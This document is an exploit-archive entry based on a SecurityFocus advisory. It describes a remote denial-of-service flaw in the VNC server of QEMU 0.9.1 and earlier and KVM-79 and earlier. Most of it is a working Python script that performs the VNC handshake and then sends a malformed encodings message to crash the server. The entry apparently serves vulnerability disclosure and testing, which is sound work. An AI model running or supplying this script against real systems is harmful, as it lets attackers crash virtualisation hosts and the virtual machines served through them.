source: http://www.securityfocus.com/bid/32910/info

QEMU and KVM are prone to a remote denial-of-service vulnerability that affects the included VNC server.

Attackers can exploit this issue to create a denial-of-service condition.

The following are vulnerable:

QEMU 0.9.1 and prior
KVM-79 and prior

##
## vnc remote DoS
##

import socket
import time
import struct
import sys

if len(sys.argv)<3:
	print "Usage: %s host port" % sys.argv[0]
	exit(0)

host = sys.argv[1] # "127.0.0.1" # debian 4
port = int(sys.argv[2]) # 5900

s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
# rec-send versions
srvversion = s.recv(100)
cliversion=srvversion
s.send(cliversion)
print "Server version: %s" % srvversion

#Security types

sec=s.recv(100)
print "Number of security types: %d" % ord(sec[0])
s.send(sec[1])

# Authentication result
auth=s.recv(100)
if auth=="\x00\x00\x00\x00":
	print "Auth ok."

# Share desktop flag: no
s.send("\x00")

# Server framebuffer parameters:
framebuf=s.recv(100)

# Trigger the bug
s.send("\x02\x00\x00\x00\x00\xff"+struct.pack("<L",1)*5)

s.close()